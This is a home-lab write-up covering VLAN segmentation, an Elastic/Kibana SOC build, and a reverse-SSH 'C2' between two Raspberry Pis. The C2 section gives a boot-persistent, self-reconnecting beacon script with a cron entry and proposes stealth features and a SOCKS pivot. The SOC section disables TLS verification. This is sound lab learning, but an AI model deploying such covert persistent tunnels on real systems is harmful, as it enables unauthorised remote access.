## ****🔬 Home Lab****

##  <img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/32539918-570f-4a01-a0f2-660f5fd5d158" />
---

# **⚙️ Network Segmentation & VLAN Implementation Summary**

**Date:** 2025-11-18
**Engineer:** Bruce Thornton
**Environment:** pfSense + TP-Link TL-SG108E + Multi-VLAN Red Team/SOC Lab

---

# **1. Objective**

To rebuild and properly segment a multi-device cybersecurity lab environment using **pfSense** and a **TP-Link TL-SG108E Easy Smart Switch**, ensuring:

* Logical network segmentation
* Isolated VLANs for SOC, Attacker, C2 Server, Victim, and Honeypot
* Centralized routing/DHCP on pfSense
* SOC monitoring visibility while maintaining realistic red-team boundaries
* Safe, non-disruptive VLAN configuration on the TL-SG108E
* Stable baseline for future **Security Onion / Elastic Stack** integration

---

# **2. Baseline Recovery**

After previous failed VLAN attempts, the environment was restored to a clean operational state.

## **2.1 pfSense Recovery**

* Reset admin credentials via console (Option 3)
* Restored access to webConfigurator
* Verified LAN IP: **10.0.1.1/24**
* Confirmed LAN DHCP active (**10.0.1.100–200**)

## **2.2 Switch Recovery**

* Factory reset TL-SG108E
* Switch accessible at **192.168.0.1**
* All ports default:

  * VLAN1 untagged
  * PVID = 1

A reliable baseline was established for safe VLAN reconstruction.

---

# **3. VLAN Architecture (Target Design)**

| VLAN   | Purpose               | Gateway   | Subnet       | Switch Port      |
| ------ | --------------------- | --------- | ------------ | ---------------- |
| **10** | SOC (Kali Purple)     | 10.0.10.1 | 10.0.10.0/24 | 2                |
| **20** | DefenderBox (Victim)  | 10.0.20.1 | 10.0.20.0/24 | 3                |
| **30** | Attacker Pi           | 10.0.30.1 | 10.0.30.0/24 | 4                |
| **31** | C2 Server Pi          | 10.0.31.1 | 10.0.31.0/24 | 5                |
| **50** | Honeypot (OpenCanary) | 10.0.50.1 | 10.0.50.0/24 | 6                |
| **1**  | pfSense LAN (mgmt)    | 10.0.1.1  | 10.0.1.0/24  | 1 (7–8 optional) |

---

# **4. pfSense VLAN Configuration**

## **4.1 VLAN Definitions**

Under **Interfaces → Assignments → VLANs**, created:

* VLAN10 (SOC)
* VLAN20 (Victim)
* VLAN30 (Attacker)
* VLAN31 (C2)
* VLAN50 (Honeypot)
  (All on parent interface **ue0**)

## **4.2 VLAN Interface Assignments**

| Interface          | Static IP | Mask |
| ------------------ | --------- | ---- |
| VLAN10_SOC         | 10.0.10.1 | /24  |
| VLAN20_DefenderBox | 10.0.20.1 | /24  |
| VLAN30_Attacker    | 10.0.30.1 | /24  |
| VLAN31_C2          | 10.0.31.1 | /24  |
| VLAN50_HoneyPot    | 10.0.50.1 | /24  |

**LAN (ue0)** remained: **10.0.1.1/24**
→ This prevented lockout during build.

## **4.3 DHCP Services**

DHCP enabled per VLAN:

* Ranges: **.100–.200** for each subnet
* LAN DHCP remained active for stability

---

# **5. Switch Configuration (TP-Link Safe VLAN Method)**

Because TL-SG108E “Easy Smart” switches enforce VLAN rules strictly, the safe method was used to avoid accidental lockouts.

## **5.1 VLAN Membership**

### **Port 1 (pfSense)**

Tagged for all VLANs (Trunk):

| VLAN | Tagged | Untagged        |
| ---- | ------ | --------------- |
| 10   | ✔      |                 |
| 20   | ✔      |                 |
| 30   | ✔      |                 |
| 31   | ✔      |                 |
| 50   | ✔      |                 |
| 1    |        | ✔ (native VLAN) |

### **Ports 2–6**

Untagged members of their respective VLANs:

* **Port 2 → VLAN 10**
* **Port 3 → VLAN 20**
* **Port 4 → VLAN 30**
* **Port 5 → VLAN 31**
* **Port 6 → VLAN 50**

### **Ports 7–8**

Left as VLAN1 for safety / management access.

**VLAN1 left untouched** → prevents switch GUI lockout.

## **5.2 PVID Assignments**

| Port | PVID | Purpose                   |
| ---- | ---- | ------------------------- |
| 1    | 1    | pfSense trunk native VLAN |
| 2    | 10   | SOC                       |
| 3    | 20   | Victim                    |
| 4    | 30   | Attacker                  |
| 5    | 31   | C2                        |
| 6    | 50   | Honeypot                  |
| 7–8  | 1    | Spare/Mgmt                |

PVID ensures untagged frames from devices enter the correct VLAN.

---

# **6. Validation Results**

After finalizing VLAN membership and PVIDs:

* SOC (port 2) → **10.0.10.x**
* DefenderBox (port 3) → **10.0.20.x**
* Attacker Pi (port 4) → **10.0.30.x**
* C2 Pi (port 5) → **10.0.31.x**
* OpenCanary (port 6) → **10.0.50.x**

All VLAN devices successfully received DHCP leases from pfSense.

**SOC VLAN intentionally allowed full outbound access** to reach Elastic/Kibana dashboards.

---

# **7. Final Network State**

✔ pfSense routing all VLANs correctly
✔ Switch enforcing VLAN isolation
✔ DHCP working across each subnet
✔ SOC VLAN connected to Elastic/Kibana
✔ Devices isolated into proper red-team / blue-team zones
✔ Stable base for:

* Firewall tuning
* IDS/IPS
* Red-team testing
* C2 operations
* Honeypot telemetry
* Full cyber-range workflows

---

# **8. Summary**

The network was successfully rebuilt into a **clean, stable, enterprise-style segmented environment** after prior failed attempts. Using pfSense VLANs and the TL-SG108E safe VLAN configuration method, the lab now provides:

* Strong segmentation
* Realistic red-team vs SOC boundaries
* Centralized monitoring
* Complete isolation between roles
* Reliable routing and addressing
* A professional-grade foundation for SOC analysis, adversary simulation, and research

All implemented on low-cost hardware following industry-aligned VLAN practices.

---



# **🦹 Persistent Reverse SSH Command-and-Control Infrastructure — Lab Report: Establishing Red Team Connectivity**
+--------------------------------------------------------------+
|                        Pi 4 — C2 Server                      |
|--------------------------------------------------------------|
| Hostname: c2                                                 |
| IP: 10.0.31.100                                              |
|                                                              |
| Listens on reverse SSH port:                                 |
|     ssh bruce@localhost -p ****                              |
|                                                              |
| Provides operator access → SOC → Elastic → Log Review        |
+---------------------------▲----------------------------------+
                            │
                            │ Reverse SSH Tunnel (persistent)
                            │ Established OUTBOUND from Pi 3
                            │
+---------------------------┴----------------------------------+
|                      Pi 3 — Beacon ("fob")                   |
|--------------------------------------------------------------|
| Lives behind NAT (no inbound accessibility)                  |
|                                                              |
| Calls home using:                                            |
|     ssh -N -R ****:localhost:** bruce@10.0.31.100            |
|                                                              |
| reverse-tunnel.sh runs at boot:                              |
|   - sleep 60 (network wait)                                  |
|   - retry loop                                               |
|   - auto heal                                                |
+--------------------------------------------------------------+


## **1. Purpose**

The objective of this lab was to design and implement a **persistent reverse SSH tunnel** between two Raspberry Pi systems to emulate a Command-and-Control (C2) architecture frequently used in red-team operations, remote administration, and advanced post-exploitation scenarios.

The goal was to enable:

* A device behind NAT/firewalls (**Pi 3**) to automatically establish and maintain a remote tunnel to a C2 node (**Pi 4**).
* The C2 node to SSH back into Pi 3 at any time without direct network reachability.
* Full persistence, automatic reconnection, and self-healing capabilities.

---

## **2. System Overview**

### **Hardware**

| Device             | Hostname | Role            | Description                                         |
| ------------------ | -------- | --------------- | --------------------------------------------------- |
| **Raspberry Pi 3** | `fob`    | Client / Beacon | Hidden system behind NAT; initiates outbound tunnel |
| **Raspberry Pi 4** | `c2`     | Server / C2     | Receives tunnel and provides remote operator access |

### **Network Characteristics**

* Pi 3 has **no inbound access** through NAT/firewall.
* Outbound SSH from Pi 3 is allowed.
* Pi 4 is reachable as `10.0.31.100`.

---

## **3. Conceptual Architecture**

### **3.1 Why Reverse SSH?**

Standard SSH requires inbound connectivity:

```
Pi 4 → Pi 3
```

Reverse SSH works even behind NAT:

```
Pi 3 → Pi 4  (outbound)
Pi 4 → Pi 3  (via reverse-forwarded port)
```

### **3.2 C2 Model**

The configuration replicates real-world C2 behavior:

* **Beacon**: Pi 3 continuously calls home.
* **C2 Node**: Pi 4 initiates shells back into Pi 3.
* **Persistence**: Reconnects automatically.
* **Stealth**: No visible shell or user interaction on Pi 3.

---

## **4. Implementation Steps**

### **4.1 Key-Based Authentication**

On Pi 3:

```bash
ssh-keygen -t *********
ssh-copy-id bruce@10.0.31.100
```

This enables non-interactive SSH required for persistence.

---

### **4.2 Manual Reverse SSH Tunnel**

From Pi 3:

```bash
ssh -N -R ****:localhost:** bruce@10.0.31.100
```

**Explanation:**

| Component              | Purpose                                                |
| ---------------------- | ------------------------------------------------------ |
| `-N`                   | Tunnel only, no remote shell                           |
| `-R ****:localhost:**` | Makes Pi 3’s SSH service available on Pi 4’s port **** |

Pi 4 accesses Pi 3 via:

```bash
ssh bruce@localhost -p ****
```

---

### **4.3 Persistent C2 Beacon Script**

A script was created on Pi 3:

**`/home/bruce/reverse-tunnel.sh`**

```bash
#!/bin/bash

# Wait a bit for network to come up
sleep 60

while true; do
  /usr/bin/ssh -N -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
    -R ****:localhost:** bruce@10.0.31.100
  sleep 5
done
```

**Features:**

* Waits for networking at boot
* Maintains a persistent loop
* Automatically reconnects after failure
* Uses SSH keepalive options

---

### **4.4 Run on Boot with Cron**

Pi 3 crontab entry:

```bash
@reboot /home/bruce/reverse-tunnel.sh >> /home/bruce/reverse-tunnel.log 2>&1
```

This ensures the beacon activates at startup.

---

## **5. Testing & Verification**

### **5.1 Manual Script Test**

```bash
bash -x ~/reverse-tunnel.sh
```

Pi 4 confirmed the tunnel with:

```bash
ssh bruce@localhost -p ****
```

### **5.2 Boot Persistence Test**

After rebooting Pi 3:

```bash
sudo reboot
```

Pi 4 successfully connected again:

```bash
ssh bruce@localhost -p ****
```

This verified:

* Script execution at boot
* Successful reverse tunnel creation
* Stable C2 access

---

## **6. Results**

This lab produced a fully functional reverse SSH C2 system featuring:

### ✔ Persistent reverse tunnel

### ✔ Automatic reconnection

### ✔ Boot persistence

### ✔ NAT/firewall traversal

### ✔ Secure SSH-based transport

### ✔ Remote shell access from Pi 4 → Pi 3

### ✔ Autonomous self-healing behavior

The configuration operates silently on Pi 3 with no visible interactive shell.

---

## **7. Security Considerations**

* Only outbound SSH is used — no exposed ports on Pi 3.
* Ed***** key-based authentication improves security and automation.
* Encrypted SSH transport prevents credential or command interception.
* Pi 4 acts as a trusted control point.

---

## **8. Future Enhancements**

### **Operational**

* Convert cron job to `systemd` service
* Integrate `autossh` for deeper resiliency
* Add centralized logging on Pi 4

### **C2 Capabilities**

* Add additional reverse tunnels (web, VNC, APIs):

  ```bash
  -R ****:localhost:****
  -R ****:localhost:****
  ```
* Implement SOCKS5 proxy pivot:

  ```bash
  ssh -D **** bruce@localhost -p ****
  ```

### **Stealth**

* Random beacon intervals
* Port-knocking activation
* Hidden service names
* Encrypted configuration file

---

## **9. Conclusion**

This project successfully deployed a **persistent, autonomous reverse SSH C2 architecture** using Raspberry Pi systems. Pi 3 reliably connects outbound to Pi 4 at startup and maintains a tunnel enabling Pi 4 to gain shell access at any time.

The design is secure, resilient, and mirrors professional C2 behavior, making it ideal for advanced cybersecurity lab experimentation, red-team infrastructure development, and remote network pivoting.

---

---

# 🧪 Enterprise SOC Lab Build Summary Elasticsearch/Kibana/Windows 11 Configuration

### *Kali Purple → Elasticsearch → Kibana → Fleet Server → Windows 11 Endpoint*

**Author:** *Bruce Thornton*
**Date:** *2025*

---

## 📌 Overview

This project documents the build of a full **security operations center (SOC)** in a home lab using:

* **Kali Purple** (SOC workstation)
* **Elasticsearch** (data store)
* **Kibana** (SOC UI & SIEM)
* **Fleet Server** (endpoint management)
* **Windows 11 Pro** (DefenderBox endpoint)
* **pfSense** (firewall & router)
* **TP-Link Managed Switch** (VLAN segmentation)

The result is a fully functional, enterprise-grade SOC architecture running inside a multi-VLAN cyber range.

---

# 1. ⚙️ Installing Kali Purple From ISO

## 1.1 Download ISO

Download the **Kali Purple ISO** from the official site:

```
https://www.kali.org/get-kali/
```

This ISO includes SOC tools, dashboards, detection frameworks, and analyst utilities.

## 1.2 Flash ISO to USB

Use a tool such as:

* **balenaEtcher**
* **Rufus**

Flash the ISO → USB and boot the laptop from it.

## 1.3 Install Kali Purple on the laptop

Steps completed:

* Boot → *Graphical Install*
* Set hostname: `BlueTeam`
* Automatic partitioning
* User creation
* Package installation
* First boot + updates

Kali Purple now serves as the core SOC host.

---

# 2. 🛠 Preparing the System

## 2.1 Update system

```bash
sudo apt update && sudo apt upgrade -y
```

## 2.2 Ensure dependencies for Elasticsearch

Kali ships with compatible Java, so no manual install was required.

## 2.3 SOC hardening

* Increased system limits
* Ensured stable hostname resolution
* Verified RAM & disk for Elastic
* Enabled auto-start for services

---

# 3. 🧩 Installing the Elastic Stack

## 3.1 Install Elasticsearch

* Added Elastic apt repository
* Installed elasticsearch package
* Enabled security auto-configuration
* Verified installation:

```bash
curl -k https://localhost:****
```

Elasticsearch generated:

* TLS certs
* CA fingerprint
* `elastic` superuser credentials

## 3.2 Install Kibana

Kibana was installed and configured to start on boot.

The initial problem:
❌ Kibana would not start because the config incorrectly used the **elastic** superuser.

Resolved by configuring **kibana_system** account:

```yaml
elasticsearch.username: "kibana_system"
elasticsearch.ssl.verificationMode: "none"
```

After correction:

* Kibana successfully listened on port **$$$$**
* UI accessible at:

```
http://localhost:****
```

---

# 4. 🧩 Deploying Fleet Server (SOC Backend)

Fleet Server was created inside Kibana using:

```
https://10.0.10.100:****
```

This IP is the SOC VLAN interface of the Kali Purple machine.

Fleet generated:

* Enrollment token
* Fleet Server policy
* Elasticsearch CA fingerprint

## 4.1 Install Elastic Agent as Fleet Server

Extract tarball:

```bash
tar xzvf elastic-agent-8.19.7-linux-x86_64.tar.gz
cd elastic-agent-8.19.7-linux-x86_64
```

Install using the Kibana-generated command:

```bash
sudo ./elastic-agent install \
  --fleet-server-es=https://localhost:**** \
  --fleet-server-service-token=<token> \
  --fleet-server-policy=fleet-server-policy \
  --fleet-server-es-ca-trusted-fingerprint=<fingerprint> \
  --fleet-server-port=****
```

Confirmed:

* Certificate generation
* Daemon start
* Enrollment success

Fleet Server appeared as **Healthy** in Kibana.

---

# 5. 🪟 Enrolling Windows 11 Pro (DefenderBox)

## 5.1 Prepare Windows

* Open PowerShell *as Administrator*
* Allow downloads and execution

## 5.2 Download Elastic Agent ZIP

```powershell
Invoke-WebRequest -Uri https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.19.7-windows-x86_64.zip -OutFile elastic-agent.zip
Expand-Archive .\elastic-agent.zip -DestinationPath .
cd elastic-agent-8.19.7-windows-x86_64
```

## 5.3 Install & Enroll Windows Agent

Use the command generated by Fleet:

```powershell
.\elastic-agent.exe install --url=https://10.0.10.100:**** --enrollment-token=<token> --insecure
```

Confirmed:

* Agent installed as a Windows service
* Enrollment succeeded
* Data began flowing into Elastic

## 5.4 Validation in Fleet UI

In **Kibana → Fleet → Agents**, Windows appears as:

* 🟢 **Healthy**
* OS: Windows 11 Pro
* Logs & metrics streaming

Windows telemetry includes:

* Security events
* Network events
* Process logs
* Sysmon-style behavior
* Detections from Elastic Security

---

# 6. 🌐 Final SOC Architecture

```
                 ┌────────────────────────────┐
                 │        pfSense Firewall    │
                 │   VLANs + Routing + DHCP   │
                 └─────────────┬──────────────┘
                               │
                 ┌─────────────┴──────────────┐
                 │  TP-Link Managed Switch     │
                 └──────┬──────────┬──────────┘
                        │          │
               VLAN 10  │          │  VLAN 20
                        │          │
        ┌───────────────┘      ┌───────────────┐
        │ Kali Purple Laptop    │ Windows 11    │
        │ SOC / Fleet Server    │ DefenderBox   │
        │ Elasticsearch + Kibana│ Elastic Agent │
        └────────────────────────┘──────────────┘
```

I now have a **real SOC environment**, not a simulation.

---

# 7. 🏁 Summary of Achievements

I have successfully built:

* ✔ Multi-VLAN enterprise-like network
* ✔ pfSense firewall segmentation
* ✔ Managed switch VLAN configuration
* ✔ Kali Purple SOC workstation
* ✔ Elasticsearch backend
* ✔ Kibana SIEM interface
* ✔ Fleet Server management backend
* ✔ Windows 11 Pro endpoint monitoring
* ✔ Full telemetry + detections
* ✔ Working elastic-agent ecosystem

This is equivalent to building the backbone of an enterprise SIEM/SOC.

---


